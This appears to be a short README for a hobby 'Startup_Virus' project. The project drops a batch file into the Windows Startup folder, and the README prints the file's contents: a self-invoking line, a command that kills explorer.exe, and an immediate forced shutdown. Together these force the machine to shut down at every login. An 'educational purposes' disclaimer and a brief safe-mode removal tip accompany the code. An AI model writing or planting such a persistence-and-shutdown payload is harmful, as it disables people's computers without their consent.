# Startup_Virus

    **Everything was done purely for educational purposes. The spread of viruses is bad! and illegal!**

Simple virus. It is creating .bat file in %APPDATA%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup.

You can easily edit it. By default, the file contains the following code: `

system %0 %0 
taskkill /F /IM explorer.exe
shutdown /s /t 1
`.
Then it will shutdown ur computer.

You can defeat this virus by deleting the .bat file in your Startup folder in safe mod.

